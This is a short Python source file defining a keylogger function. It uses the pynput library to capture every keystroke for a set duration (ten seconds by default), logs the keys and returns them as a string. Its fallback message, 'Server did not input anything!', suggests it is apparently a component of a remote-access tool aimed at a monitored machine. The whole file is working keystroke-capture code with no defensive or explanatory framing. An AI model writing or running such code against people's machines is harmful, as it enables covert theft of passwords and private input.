import logging
import os
import time
import threading
from pynput.keyboard import Listener


def key_logger(duration=None):
    global listener
    global key_string

    key_string = ""

    def on_press(key):
        global key_string
        try:
            key_string += str(key) + " "
            logging.info(key)
        except AttributeError:
            key_string += str(key)
            logging.error(key)

    with Listener(on_press=on_press) as listener:
        listener_thread = threading.Thread(target=listener.join)
        listener_thread.start()
        # listen for ten seconds
        time.sleep(duration if duration is not None else 10)
        listener.stop()

    if key_string != "":
        return key_string
    else:
        return "Server did not input anything!"
